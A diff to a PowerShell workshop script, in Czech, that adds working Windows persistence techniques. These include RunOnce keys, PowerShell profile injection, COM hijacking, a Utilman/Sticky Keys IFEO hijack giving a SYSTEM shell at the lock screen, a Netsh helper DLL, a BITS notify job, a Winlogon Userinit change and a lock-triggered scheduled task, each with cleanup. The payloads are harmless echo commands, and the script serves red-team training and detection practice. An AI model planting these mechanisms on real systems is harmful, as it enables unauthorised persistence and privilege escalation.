@@ -1,4 +1,4 @@
-# For educational purposes only. Use responsibly and ethically.
+﻿# For educational purposes only. Use responsibly and ethically.
 # This script demonstrates various persistence techniques in Windows.
 # It is intended for security professionals and ethical hackers to understand how persistence works.
 # Ensure you run this script with administrative privileges.
@@ -51,30 +51,43 @@ function Show-Menu {
     Write-Host "  Created by: Hack3r.cz" -ForegroundColor Cyan
     Write-Host "  For educational purposes only." -ForegroundColor Cyan
     Write-Host "==========================================================" -ForegroundColor Cyan
-    Write-Host "Tento skript demonstruje ruzne techniky perzistence v systemu Windows." -ForegroundColor Yellow
-    Write-Host "Pouzijte ho zodpovedne a eticky. Skript vyzaduje administrativni prava." -ForegroundColor Yellow
-    Write-Host "Zkontrolujte, ze mate administrativni prava pro spusteni tohoto skriptu." -ForegroundColor Yellow
+    Write-Host "Vyberte techniku persistence, kterou chcete demonstrovat:" -ForegroundColor Yellow
     Write-Host "==========================================================" -ForegroundColor Cyan
-    Write-Host "Vyberte techniku perzistence, kterou chcete otestovat:" -ForegroundColor Yellow
+    Write-Host ""
+    Write-Host "--- Uzivatelska uroven (bez admin prav) ---" -ForegroundColor Green
+    Write-Host "  2) Startup slozka (vlastni profil)"
+    Write-Host "  4) Run klic (HKCU)"
+    Write-Host "  7) Planovana uloha (kazdych 30 minut)"
+    Write-Host " 10) Logon Script (UserInitMprLogonScript)"
+    Write-Host " 12) Screensaver (SCRNSAVE.EXE)"
+    Write-Host " 13) Office Test klic"
+    Write-Host " 15) RunOnce klic (HKCU)"
+    Write-Host " 17) PowerShell Profile (CurrentUser)"
+    Write-Host " 18) COM Hijacking (HKCU CLSID)"
+    Write-Host " 23) Planovana uloha spustena PRI ZAMKNUTI OBRAZOVKY (aha demo)" -ForegroundColor Magenta
+    Write-Host ""
+    Write-Host "--- Systemova uroven (vyzaduje admin) ---" -ForegroundColor Yellow
+    Write-Host "  1) Sluzba (Service)"
+    Write-Host "  3) Startup slozka (vsichni uzivatele)"
+    Write-Host "  5) Run klic (HKLM)"
+    Write-Host "  6) Run klic (HKLM WOW6432Node - 32-bit)"
+    Write-Host "  8) Debugger IFEO (charmap.exe)"
+    Write-Host "  9) WMI Event Filter + Consumer"
+    Write-Host " 11) AppInit_DLLs"
+    Write-Host " 14) Winlogon Shell"
+    Write-Host " 16) RunOnce klic (HKLM)"
+    Write-Host " 19) Utilman / Sticky Keys hijack (IFEO)" -ForegroundColor Red
+    Write-Host " 20) Netsh Helper DLL"
+    Write-Host " 21) BITS Job (notify command)"
+    Write-Host " 22) Winlogon Userinit"
+    Write-Host ""
+    Write-Host "--- Ostatni ---" -ForegroundColor Cyan
+    Write-Host " 90) Restartovat skript jako Administrator (UAC prompt)" -ForegroundColor Yellow
+    Write-Host " 99) Odstranit VSECHNY vytvorene persistence"
+    Write-Host "  0) Ukoncit skript"
+    Write-Host ""
     Write-Host "==========================================================" -ForegroundColor Cyan
-    Write-Host "1) Sluzba (Service) (as admin)"
-    Write-Host "2) Startup (vlastni profil)"
-    Write-Host "3) Startup (vsichni uzivatele) (as admin)"
-    Write-Host "4) Run klic v HKCU (HKEY_CURRENT_USER)"
-    Write-Host "5) Run klic v HKLM (HKEY_LOCAL_MACHINE) (as admin)"
-    Write-Host "6) Run klic pro 32bitove aplikace v HKLM (HKEY_LOCAL_MACHINE WOW6432Node) (as admin)"
-    Write-Host "7) Planovana uloha (Scheduled Task)"
-    Write-Host "8) Debugger (Image File Execution Options) (as admin)"
-    Write-Host "9) WMI Filtr (WMI Filter) (as admin)"
-    Write-Host "10) Logon Script"
-    Write-Host "11) AppInit_DLLs (as admin)"
-    Write-Host "12) Screensaver"
-    Write-Host "13) Office Test"
-    Write-Host "14) Winlogon Shell (as admin)"
-    Write-Host "99) Odstranit vsechny persistence techniky"
-    Write-Host "==========================================================" -ForegroundColor Cyan
-    Write-Host "Zadejte cislo moznosti (1-14 nebo 99 pro odstraneni)" -ForegroundColor Yellow
-    Write-Host "Poznamka: Polozky oznacene jako '(as admin)' vyzaduji spusteni skriptu s administrativnimi pravy." -ForegroundColor Yellow
+    Write-Host "Poznamka: Polozky pod 'Systemova uroven' vyzaduji admin prava." -ForegroundColor Yellow
     Write-Host "==========================================================" -ForegroundColor Cyan
 }
 
@@ -295,6 +308,229 @@ do {
             Write-Host "Kdy se spousti: pri prihlaseni uzivatele (prez start explorer.exe). Pouziti: modifikace prihlasovaciho shellu pro spousteni dalsich procesu." -ForegroundColor Yellow
             Log-Action "Set Winlogon Shell: $valueData"
         }
+        15 {
+            # RunOnce (HKCU) - runs once at next logon, then the value is deleted
+            Write-Host "RunOnce klic v HKCU: Zkontrolujte 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'."
+            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+            $valueName = "demoOnce"
+            $valueData = 'cmd /k echo Me spousti RunOnce v HKCU - spusti se jednou pri dalsim prihlaseni a pak se automaticky smaze'
+            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
+            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ."
+            Write-Host "Pridano: HKCU RunOnce -> $regPath\$valueName = $valueData" -ForegroundColor Green
+            Write-Host "Kdy se spousti: pri PRISTIM prihlaseni uzivatele - jednorazove, pak se hodnota v registru automaticky smaze." -ForegroundColor Yellow
+            Write-Host "Pouziti: dokonceni instalace, druha faze payloadu, cleanup akce, migrace." -ForegroundColor Yellow
+            Log-Action "Added HKCU RunOnce entry: $valueName -> $valueData"
+        }
+        16 {
+            # RunOnce (HKLM) - system-wide, runs once at next logon of any user
+            if (-not (Require-Administrator)) { break }
+            Write-Host "RunOnce klic v HKLM: Zkontrolujte 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce'."
+            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+            $valueName = "demoOnce"
+            $valueData = 'cmd /k echo Me spousti RunOnce v HKLM - spusti se jednou po pristim startu / prihlaseni a pak se automaticky smaze'
+            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
+            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ do HKLM."
+            Write-Host "Pridano: HKLM RunOnce -> $regPath\$valueName = $valueData" -ForegroundColor Green
+            Write-Host "Kdy se spousti: pri PRISTIM prihlaseni jakehokoliv uzivatele - jednorazove system-wide." -ForegroundColor Yellow
+            Write-Host "Pouziti: jednorazova akce po restartu (napr. dokonceni patche, instalace ovladace, atd.)." -ForegroundColor Yellow
+            Log-Action "Added HKLM RunOnce entry: $valueName -> $valueData"
+        }
+        17 {
+            # PowerShell Profile - executes at every PowerShell start (CurrentUser scope)
+            $profilePath = $PROFILE.CurrentUserAllHosts
+            Write-Host "PowerShell Profile (CurrentUser, AllHosts): $profilePath"
+            $profileDir = Split-Path -Parent $profilePath
+            if (-not (Test-Path $profileDir)) { New-Item -Path $profileDir -ItemType Directory -Force | Out-Null }
+            $marker = '# DEMO_PERSISTENCE_MARKER'
+            $line = 'Write-Host ("PS Profile persistence: spustena pod " + $env:USERNAME + " na " + $env:COMPUTERNAME) -ForegroundColor Magenta ' + $marker
+            if (Test-Path $profilePath) {
+                $existing = Get-Content $profilePath -Raw -ErrorAction SilentlyContinue
+                if (-not $existing -or ($existing -notmatch [regex]::Escape($marker))) {
+                    Add-Content -Path $profilePath -Value "`r`n$line" -Encoding UTF8
+                }
+            } else {
+                Set-Content -Path $profilePath -Value $line -Encoding UTF8
+            }
+            Write-Host "Do PS profilu byl pridan radek s markerem $marker."
+            Write-Host "Pridano: PowerShell profile -> $profilePath" -ForegroundColor Green
+            Write-Host "Kdy se spousti: pri KAZDEM startu PowerShellu (konzole, ISE, VSCode terminal, ...) pod danym uzivatelem." -ForegroundColor Yellow
+            Write-Host "Pouziti: uzivatelska persistence typicka pro red-team scenare - kazdy PowerShell = trigger." -ForegroundColor Yellow
+            Log-Action "Appended demo line to PowerShell profile: $profilePath"
+        }
+        18 {
+            # COM Hijacking - registrace uzivatelskeho CLSID, ktery presmeruje na cmd.exe.
+            # V realnem utoku by se hijacknul EXISTUJICI CLSID pouzivany napr. explorer.exe nebo prohlizecem.
+            Write-Host "COM Hijacking: HKCU:\Software\Classes\CLSID (per-user, bez admin)."
+            $demoGuid = "{DEADBEEF-1234-5678-9ABC-DEF012345678}"
+            $regPath = "HKCU:\Software\Classes\CLSID\$demoGuid\InprocServer32"
+            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+            New-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Windows\System32\cmd.exe" -PropertyType String -Force | Out-Null
+            New-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment" -PropertyType String -Force | Out-Null
+            Write-Host "Do registru byl pridan CLSID $demoGuid."
+            Write-Host "Pridano: COM Hijacking -> HKCU\Software\Classes\CLSID\$demoGuid\InprocServer32" -ForegroundColor Green
+            Write-Host "Kdy se spousti: kdyz nejaky proces vytvori COM objekt s timto CLSID (v realu se hijackuje CLSID, ktery volaji explorer/office/browser)." -ForegroundColor Yellow
+            Write-Host "Poznamka: v tomto demu jsou pouzity smyslneny GUID a exe misto DLL - realny utok by hijacknul znamy CLSID a nahradil DLL." -ForegroundColor Yellow
+            Log-Action "Added COM Hijack CLSID: $demoGuid -> cmd.exe"
+        }
+        19 {
+            # Utilman / Sticky Keys hijack pres IFEO Debugger.
+            # Umoznuje spustit cmd.exe (SYSTEM) primo z lock screenu pres Win+U nebo tlacitko Ease of Access.
+            if (-not (Require-Administrator)) { break }
+            Write-Host "Utilman / Sticky Keys hijack (IFEO Debugger)."
+            Write-Host "POZOR: Tato technika umoznuje spustit cmd.exe pod SYSTEM PRIMO Z LOCK SCREENU (Win+U)!" -ForegroundColor Red
+            Write-Host "V labu je to bezpecne demo - v produkci by slo o kriticky bypass a eskalaci privilegii." -ForegroundColor Red
+            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
+            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+            New-ItemProperty -Path $regPath -Name "Debugger" -Value "C:\Windows\System32\cmd.exe" -PropertyType String -Force | Out-Null
+            Write-Host "Pridano: IFEO Debugger for utilman.exe -> $regPath\Debugger = cmd.exe" -ForegroundColor Green
+            Write-Host "Kdy se spousti: pri kliknuti na 'Ease of Access' na lock screenu nebo stisknuti Win+U." -ForegroundColor Yellow
+            Write-Host "Pouziti: pre-logon persistence + SYSTEM shell z lock screenu (klasicky post-exploitation krok)." -ForegroundColor Yellow
+            Log-Action "Added IFEO Debugger for utilman.exe -> cmd.exe (Sticky Keys / Utilman hijack)"
+        }
+        20 {
+            # Netsh Helper DLL - kazde spusteni netsh.exe nacte registrovane helper DLL.
+            # V demu registrujeme neexistujici DLL - klic ale zustane v registru pro detekci.
+            if (-not (Require-Administrator)) { break }
+            Write-Host "Netsh Helper DLL: 'HKLM:\SOFTWARE\Microsoft\Netsh'."
+            $regPath = "HKLM:\SOFTWARE\Microsoft\Netsh"
+            $valueName = "demo"
+            $valueData = "C:\Windows\System32\demo_helper.dll"
+            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
+            Write-Host "Do registru byl pridan zaznam netsh helperu (DLL zamerne neexistuje - jen registrace pro detekci)."
+            Write-Host "Pridano: Netsh Helper -> $regPath\$valueName = $valueData" -ForegroundColor Green
+            Write-Host "Kdy se spousti: pri kazdem spusteni 'netsh.exe' (mnoho spravcovskych a monitorovacich skriptu jej pouziva)." -ForegroundColor Yellow
+            Write-Host "Pouziti: DLL load pri pouziti netsh - dokumentovana APT persistence (napr. Turla)." -ForegroundColor Yellow
+            Log-Action "Added Netsh helper registration: $valueName -> $valueData (DLL neexistuje - demo)"
+        }
+        21 {
+            # BITS Job - Background Intelligent Transfer Service umoznuje spustit prikaz pri zmene stavu jobu.
+            # BITS prezije reboot a pravidelne se pokousi o resume - z toho vznika persistence.
+            Write-Host "BITS Job: vytvarim BITS job s SetNotifyCmdLine."
+            try {
+                $jobName = "DemoBitsJob"
+                # remove existing job with same name if exists
+                & bitsadmin /cancel $jobName 2>$null | Out-Null
+                & bitsadmin /create $jobName | Out-Null
+                & bitsadmin /addfile $jobName "https://example.com/dummy.txt" "$env:TEMP\dummy_bits.txt" | Out-Null
+                & bitsadmin /SetNotifyCmdLine $jobName "cmd.exe" "/k echo Me spustila BITS job notifikace na PC %COMPUTERNAME%" | Out-Null
+                & bitsadmin /SetMinRetryDelay $jobName 60 | Out-Null
+                & bitsadmin /resume $jobName | Out-Null
+                Write-Host "Pridano: BITS job '$jobName' s notify cmd.exe /k echo ..." -ForegroundColor Green
+                Write-Host "Kdy se spousti: pri zmene stavu jobu (uspech nebo chyba prenosu). BITS umi resume po restartu -> persistence prezije reboot." -ForegroundColor Yellow
+                Write-Host "Pouziti: skryta persistence pouzivajici legitimni Windows sluzbu (Background Intelligent Transfer)." -ForegroundColor Yellow
+                Log-Action "Created BITS job: $jobName with SetNotifyCmdLine"
+            } catch {
+                Write-Host "Chyba pri vytvareni BITS jobu: $_" -ForegroundColor Red
+                Log-Action "ERROR creating BITS job: $_"
+            }
+        }
+        22 {
+            # Winlogon Userinit - hodnota, ktera se spousti hned po prihlaseni jako prvni.
+            # POZOR na spravnou syntaxi vcetne koncove carky - jinak muze byt prihlaseni rozbite.
+            if (-not (Require-Administrator)) { break }
+            Write-Host "Winlogon Userinit: 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'."
+            Write-Host "POZOR: Zmena Userinit muze rozbit prihlaseni! Format vyzaduje presnou syntaxi vcetne koncove carky." -ForegroundColor Red
+            $regPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+            $valueName = "Userinit"
+            $valueData = "C:\Windows\system32\userinit.exe,C:\Windows\System32\cmd.exe,"
+            Set-ItemProperty -Path $regPath -Name $valueName -Value $valueData -Force | Out-Null
+            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
+            Write-Host "Pridano: Winlogon Userinit -> $regPath\$valueName = $valueData" -ForegroundColor Green
+            Write-Host "Kdy se spousti: hned po prihlaseni uzivatele, PRED spustenim explorer.exe (via Shell)." -ForegroundColor Yellow
+            Write-Host "Pouziti: velmi rana persistence pri logonu - bezi drive nez vetsina EDR/AV hooku uzivatelske relace." -ForegroundColor Yellow
+            Log-Action "Set Winlogon Userinit: $valueData"
+        }
+        23 {
+            # Scheduled Task s netradicnim triggerem SESSION_STATE_CHANGE (zamknuti obrazovky).
+            # AHA DEMO pro workshop: skolitel spusti tuto volbu, stiskne Win+L a po odemknuti se objevi cmd.exe.
+            Write-Host "Planovana uloha spustena pri ZAMKNUTI OBRAZOVKY (SESSION_LOCK)."
+            Write-Host "Po dokonceni stisknte Win+L. Po odemknuti se objevi viditelne okno cmd.exe." -ForegroundColor Magenta
+            try {
+                $taskName = "DemoLockScreenTask"
+                # remove existing task with same name if exists
+                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+
+                $svc = New-Object -ComObject Schedule.Service
+                $svc.Connect()
+                $folder = $svc.GetFolder("\")
+                $td = $svc.NewTask(0)
+
+                $td.RegistrationInfo.Description = "Demo persistence spoustena pri zamknuti obrazovky - Hack3r.cz workshop"
+                $td.Settings.Enabled = $true
+                $td.Settings.Hidden = $false
+                $td.Settings.DisallowStartIfOnBatteries = $false
+                $td.Settings.StopIfGoingOnBatteries = $false
+                $td.Settings.AllowDemandStart = $true
+
+                # Trigger typ 11 = TASK_TRIGGER_SESSION_STATE_CHANGE
+                # StateChange 7 = TASK_SESSION_LOCK (dalsi hodnoty: 8 = UNLOCK, 4/5 = CONSOLE CONNECT/DISCONNECT)
+                $trigger = $td.Triggers.Create(11)
+                $trigger.StateChange = 7
+                $trigger.UserId = "$env:USERDOMAIN\$env:USERNAME"
+                $trigger.Enabled = $true
+
+                # Action: cmd.exe /k echo (viditelne okno)
+                $action = $td.Actions.Create(0)
+                $action.Path = "cmd.exe"
+                $action.Arguments = "/k echo Persistence spustena pri zamknuti obrazovky! Uzivatel: %USERNAME%  PC: %COMPUTERNAME%"
+
+                # Principal: INTERACTIVE_TOKEN (3) - okno bude viditelne pro prihlaseneho uzivatele
+                $td.Principal.LogonType = 3
+                $td.Principal.RunLevel = 0  # LUA (bez elevace)
+
+                # RegisterTaskDefinition: TASK_CREATE_OR_UPDATE = 6, logonType 3 = INTERACTIVE_TOKEN
+                $folder.RegisterTaskDefinition($taskName, $td, 6, $null, $null, 3) | Out-Null
+
+                Write-Host "Pridano: Scheduled Task '$taskName' s triggerem SESSION_LOCK a viditelnym cmd.exe." -ForegroundColor Green
+                Write-Host "Kdy se spousti: kdykoliv uzivatel zamkne obrazovku (Win+L)." -ForegroundColor Yellow
+                Write-Host "Pouziti: netradicni event-based trigger - baseline sken pri startu ho neodhali, protoze uloha nema logon/boot trigger." -ForegroundColor Yellow
+                Write-Host "TIP pro skolitele: stisknte ted Win+L, prihlaste se zpet a objevi se okno cmd.exe." -ForegroundColor Magenta
+                Log-Action "Registered scheduled task: $taskName; Trigger=SESSION_LOCK (StateChange=7)"
+            } catch {
+                Write-Host "Chyba pri vytvareni ulohy: $_" -ForegroundColor Red
+                Log-Action "ERROR creating DemoLockScreenTask: $_"
+            }
+        }
+        0 {
+            Write-Host "Ukoncuji skript." -ForegroundColor Cyan
+            exit
+        }
+        90 {
+            # Elevace: pokud skript nebezi jako Administrator, spusti se znovu se zvysenymi pravy (UAC prompt).
+            if (Test-Administrator) {
+                Write-Host "Skript uz je spusten jako Administrator - neni potreba nic delat." -ForegroundColor Green
+                Log-Action "Restart-as-Admin volba pouzita, ale skript uz bezi jako admin"
+            } else {
+                Write-Host "Skript neni spusten jako Administrator." -ForegroundColor Yellow
+                Write-Host "Spoustim novou instanci s admin pravy - potvrdte UAC prompt." -ForegroundColor Yellow
+                try {
+                    # $PSCommandPath je nastaven automaticky ve script scope
+                    $scriptPath = $PSCommandPath
+                    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
+                    if (-not $scriptPath -or -not (Test-Path $scriptPath)) {
+                        Write-Host "Chyba: nepodarilo se ziskat cestu k tomuto skriptu." -ForegroundColor Red
+                        Log-Action "ERROR Restart-as-Admin: nelze zjistit cestu skriptu"
+                        break
+                    }
+                    Write-Host "Cesta skriptu: $scriptPath" -ForegroundColor Cyan
+                    Start-Process -FilePath "powershell.exe" -ArgumentList @(
+                        "-NoProfile",
+                        "-ExecutionPolicy", "Bypass",
+                        "-File", "`"$scriptPath`""
+                    ) -Verb RunAs -ErrorAction Stop
+                    Write-Host "Nova instance byla spustena. Puvodni (bez admin) se ted ukonci." -ForegroundColor Green
+                    Log-Action "Restarted script as Administrator: $scriptPath"
+                    Start-Sleep -Seconds 2
+                    exit
+                } catch {
+                    Write-Host "Chyba pri elevaci: $_" -ForegroundColor Red
+                    Write-Host "Mozne priciny: uzivatel odmitl UAC, nebo neni v roli, ktera muze elevovat." -ForegroundColor Yellow
+                    Log-Action "ERROR during Restart-as-Admin: $_"
+                }
+            }
+        }
         99 {
             # Cleanup function to remove all persistence techniques
             # This ensures that the system is returned to its original state
@@ -349,6 +585,59 @@ do {
             Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe" -ErrorAction SilentlyContinue
 
             Log-Action "Removed AppInit_DLLs, LogonScript, Screensaver, Office test key and reset Winlogon Shell"
+
+            # --- Cleanup novych technik (15-23) ---
+
+            # 15/16 RunOnce (HKCU / HKLM)
+            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "demoOnce" -ErrorAction SilentlyContinue
+            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "demoOnce" -ErrorAction SilentlyContinue
+            Log-Action "Removed RunOnce entries (HKCU/HKLM) for 'demoOnce'"
+
+            # 17 PowerShell Profile - odstranime jen radek s demo markerem
+            try {
+                $profilePath = $PROFILE.CurrentUserAllHosts
+                if (Test-Path $profilePath) {
+                    $lines = Get-Content $profilePath -ErrorAction SilentlyContinue
+                    $filtered = $lines | Where-Object { $_ -notmatch 'DEMO_PERSISTENCE_MARKER' }
+                    if ($filtered) {
+                        Set-Content -Path $profilePath -Value $filtered -Encoding UTF8
+                    } else {
+                        # profil zustal prazdny - smazeme cely soubor
+                        Remove-Item -Path $profilePath -Force -ErrorAction SilentlyContinue
+                    }
+                }
+                Log-Action "Removed DEMO_PERSISTENCE_MARKER line from PowerShell profile"
+            } catch {
+                Log-Action "ERROR cleaning PowerShell profile: $_"
+            }
+
+            # 18 COM Hijacking (HKCU CLSID)
+            Remove-Item -Path "HKCU:\Software\Classes\CLSID\{DEADBEEF-1234-5678-9ABC-DEF012345678}" -Recurse -Force -ErrorAction SilentlyContinue
+            Log-Action "Removed COM Hijack CLSID {DEADBEEF-1234-5678-9ABC-DEF012345678}"
+
+            # 19 Utilman / Sticky Keys IFEO hijack
+            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" -Recurse -Force -ErrorAction SilentlyContinue
+            Log-Action "Removed IFEO entry for utilman.exe"
+
+            # 20 Netsh Helper DLL
+            Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Netsh" -Name "demo" -ErrorAction SilentlyContinue
+            Log-Action "Removed Netsh helper registration 'demo'"
+
+            # 21 BITS Job
+            try {
+                & bitsadmin /cancel "DemoBitsJob" 2>$null | Out-Null
+                Log-Action "Cancelled BITS job DemoBitsJob"
+            } catch {
+                Log-Action "ERROR cancelling BITS job: $_"
+            }
+
+            # 22 Winlogon Userinit - obnoveni na vychozi hodnotu
+            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Windows\system32\userinit.exe," -ErrorAction SilentlyContinue
+            Log-Action "Reset Winlogon Userinit to default"
+
+            # 23 Scheduled Task s SESSION_LOCK triggerem
+            Unregister-ScheduledTask -TaskName "DemoLockScreenTask" -Confirm:$false -ErrorAction SilentlyContinue
+            Log-Action "Unregistered scheduled task: DemoLockScreenTask"
 
             Write-Host "Vsechny persistence techniky byly odstraneny."
         }
